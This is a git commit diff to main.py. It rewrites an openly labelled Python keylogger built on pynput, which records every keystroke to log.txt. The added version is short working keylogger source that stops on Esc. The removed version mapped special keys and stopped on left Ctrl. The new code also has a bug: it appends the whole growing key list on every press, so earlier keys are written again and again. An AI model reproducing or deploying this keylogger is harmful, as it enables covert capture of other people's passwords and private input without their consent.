66a13bab62fb8b72147ef0a505eff50b16a49adb
PriyanshuNegi2111 <120157315+PriyanshuNegi2111@users.noreply.github.com>
2023-08-22 22:09:49 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,113 +1,23 @@
+#This is a normal Keylogger with the Python
 from pynput.keyboard import Listener, Key
-import datetime
 
-# Global variable to track the termination key combination
-TERMINATION_KEYS = {Key.ctrl_l, 'c'}
+keys=[]
 
-# Flag to track whether the keylogger should continue running
-running = True
+def write_to_file(keys):
+    with open("log.txt","a") as f:
+        for i in keys:
+            a = str(i).replace("'",'')
+            f.write(a)
+            f.write(',')
 
-with open('log.txt', 'a') as f:
-    f.write('\n\nDate-Time:' + str(datetime.datetime.now()) + '\n')
+def on_press(key):
+    keys.append(key)
+    write_to_file(keys)
 
-def writetofile(key):
-    global running
-    letter = str(key)
-    letter = letter.replace("'", "")
-    
-    # Check if the left Ctrl key is pressed for termination
-    if key == Key.ctrl_l:
-        running = False  # Set the flag to terminate the keylogger
-        return
-    
-    # Rest of the keylogging logic
-    if letter == 'Key.space':
-        letter = ' '
-    if letter=='Key.tab':
-        letter='\t'
-    if letter=='Key.up':
-        letter='up'
-    if letter=='Key.down':
-        letter='down'
-    if letter=='Key.left':
-        letter='left'
-    if letter=='Key.right':
-        letter='right'
-    if letter=='Key.shift_l':
-        letter=''
-    if letter=='Key.shift_r':
-        letter=''
-    if letter=='Key.scroll_lock':
-        letter='scroll_lock'
-    if letter=='Key.print_screen':
-        letter='print_screen'
-    if letter=='Key.pause':
-        letter='pause'
-    if letter=='Key.page_up':
-        letter='page_up'
-    if letter=='Key.page_down':
-        letter='page_down'
-    if letter=='Key.num_lock':
-        letter='num_lock'
-    if letter=='Key.menu':
-        letter='menu'
-    if letter=='Key.insert':
-        letter='insert'
-    if letter=='Key.home':
-        letter='home'
-    if letter=='Key.f1':
-        letter='f1'
-    if letter=='Key.f2':
-        letter='f2'
-    if letter=='Key.f3':
-        letter='f3'
-    if letter=='Key.f4':
-        letter='f4'
-    if letter=='Key.f5':
-        letter='f5'
-    if letter=='Key.f6':
-        letter='f6'
-    if letter=='Key.f7':
-        letter='f7'
-    if letter=='Key.f8':
-        letter='f8'
-    if letter=='Key.f9':
-        letter='f9'
-    if letter=='Key.f10':
-        letter='f10'
-    if letter=='Key.f11':
-        letter='f11'
-    if letter=='Key.f12':
-        letter='f12'
-    if letter=='Key.esc':
-        letter='esc'
-    if letter=='Key.enter':
-        letter='\n'
-    if letter=='Key.end':
-        letter='end'
-    if letter=='Key.delete':
-        letter='del'
-    if letter=='Key.ctrl_l':
-        letter='ctrl_l'
-    if letter=='Key.ctrl_r':
-        letter='ctrl_r'
-    if letter=='Key.alt':
-        letter='alt'
-    if letter=='Key.alt_l':
-        letter='alt_l'
-    if letter=='Key.alt_r':
-        letter='alt_r'
-    if letter=='Key.caps_lock':
-        letter='caps'
-    if letter=='Key.backspace':
-        letter='back'
-
-    with open('log.txt', 'a') as f:
-        f.write(letter)
+def on_release(key):
+    if key == key.esc:
+        return False
 
 # Start the listener for key presses
-with Listener(on_press=writetofile) as l:
+with Listener(on_press=on_press,on_release=on_release) as l:
     l.join()
-
-# Code execution will reach this point when the keylogger loop ends
-print("Keylogger terminated.")
